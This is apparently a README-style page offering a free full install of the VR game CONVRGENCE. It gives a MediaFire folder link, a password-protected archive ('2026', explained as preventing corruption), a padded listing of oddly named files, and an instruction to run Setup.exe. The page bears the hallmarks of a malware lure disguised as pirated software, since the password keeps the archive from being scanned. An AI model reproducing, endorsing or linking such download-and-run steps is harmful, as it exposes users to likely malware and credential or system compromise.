## 🕹️ About

CONVRGENCE is a single-player VR action-adventure extraction shooter developed and published by Monkey-With-a-Bomb. Set in the procedurally generated Chernokamensk Anomaly Zone, it combines tense exploration, realistic gunplay, scavenging, stealth, and survival-horror atmosphere. Search dangerous locations for loot and mystical artifacts, fight hostile bandits, and return safely before nightfall with your loyal dog companion. This release is packaged for straightforward installation of the full game.

CONVRGENCE is made for VR players who enjoy atmospheric exploration, tense extraction gameplay, realistic shooting, and single-player survival horror.

## ✨ Features

- 🗺️ **Anomaly Zone** — Explore a procedurally generated world that changes from one expedition to the next.
- 🎒 **Extraction Gameplay** — Scavenge valuable loot and artifacts, then make it back safely before nightfall.
- 🎯 **VR Gunplay** — Handle weapons directly in an immersive first-person virtual reality experience.
- 🐕 **Loyal Companion** — Travel through the Zone alongside a faithful dog companion.
- 🌑 **Survival Horror** — Face bandits, dangerous anomalies, and unsettling threats hidden in the darkness.

### Step 1: Download

Download the package from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the setup expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- audio.res <- Audio resources
|-- launcher.dll <- Launcher library
|-- physics.sys <- Physics engine
|-- scripts.lic <- Game scripts
|-- Password 2026.txt <- Password reminder (empty)
|-- animations.dll <- Animation system
|-- assets.wem <- Asset audio
|-- driver.umap <- Driver data
|-- patch_1.bnk <- Audio banks
|-- license.bank <- License data
|-- global.cfg <- Global settings
|-- localization.ini <- Language files
|-- lang.sys <- Language system
|-- installer.dat <- Installer data
|-- api.pak <- API modules
|-- driver.pak <- Driver archive
|-- uninstall.key <- Uninstall key
|-- license.wem <- Audio assets
|-- dlc.md5 <- DLC checksums
|-- bootstrap.wem <- Bootstrap audio
|-- res.pak <- Resources archive
|-- update_1.ini <- Update config
|-- settings.bin <- Configuration
|-- update_1.res <- Update resources
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game will start
